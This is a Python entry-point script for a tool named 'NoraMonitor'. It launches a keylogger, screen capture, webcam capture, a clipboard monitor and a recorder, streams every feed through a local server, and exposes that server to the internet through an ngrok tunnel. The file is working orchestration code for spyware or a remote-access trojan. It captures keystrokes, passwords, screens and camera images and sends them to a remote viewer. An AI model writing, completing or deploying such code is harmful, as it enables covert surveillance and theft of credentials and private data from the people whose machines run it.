import os
import threading

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb

PORT = int(os.environ.get("NORA_PORT", 9090))
NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")

_APP_DIR       = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_TOKEN_FILE    = os.path.join(_APP_DIR, "ngrok.token")
_RECORDINGS_DIR= os.path.join(_APP_DIR, "recordings")


def _load_token():
    token = NGROK_TOKEN
    if not token and os.path.exists(_TOKEN_FILE):
        with open(_TOKEN_FILE) as f:
            token = f.read().strip()
    return token


def _start_ngrok(port):
    try:
        from pyngrok import ngrok, conf
        token = _load_token()
        if not token:
            return
        conf.get_default().auth_token = token
        tunnel = ngrok.connect(port, "http")
        url = tunnel.public_url
        def _broadcast():
            import time; time.sleep(2)
            server.broadcast_ngrok_url(url)
        threading.Thread(target=_broadcast, daemon=True).start()
    except Exception:
        pass


def main():
    recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
    camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)

    server.init(controller.handle_command, recorder, camera)

    kl.Keylogger(server.broadcast_key).start()

    capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
    capture.attach_recorder(recorder)
    capture.start()

    cb.ClipboardMonitor(server.broadcast_clipboard).start()

    threading.Thread(target=_start_ngrok, args=(PORT,), daemon=True).start()

    server.run(port=PORT)


if __name__ == "__main__":
    main()
